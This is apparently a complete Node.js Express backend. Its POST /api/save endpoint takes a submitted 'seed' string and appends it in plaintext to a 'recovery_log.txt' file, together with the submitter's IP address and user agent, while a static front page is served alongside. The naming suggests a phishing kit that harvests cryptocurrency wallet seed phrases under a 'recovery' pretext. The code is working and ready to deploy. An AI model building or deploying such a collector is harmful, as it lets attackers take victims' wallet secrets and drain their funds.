const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const LOG_PATH = process.env.RAILWAY_VOLUME_MOUNT_PATH
  ? path.join(process.env.RAILWAY_VOLUME_MOUNT_PATH, 'recovery_log.txt')
  : path.join(__dirname, 'recovery_log.txt');

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/api/save', (req, res) => {
  const { seed } = req.body;

  if (!seed || typeof seed !== 'string') {
    return res.status(400).json({ success: false, error: 'Seed is required.' });
  }

  const timestamp = new Date().toISOString();
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
  const userAgent = req.headers['user-agent'] || 'unknown';

  const logEntry = `[${timestamp}] Seed: "${seed}" | IP: ${ip} | User-Agent: ${userAgent}\n`;

  fs.appendFile(LOG_PATH, logEntry, (err) => {
    if (err) {
      console.error('Failed to write log:', err);
      return res.status(500).json({ success: false, error: 'Failed to save seed.' });
    }
    console.log(`Logged submission from ${ip}`);
    res.json({ success: true, message: 'Seed logged successfully.' });
  });
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
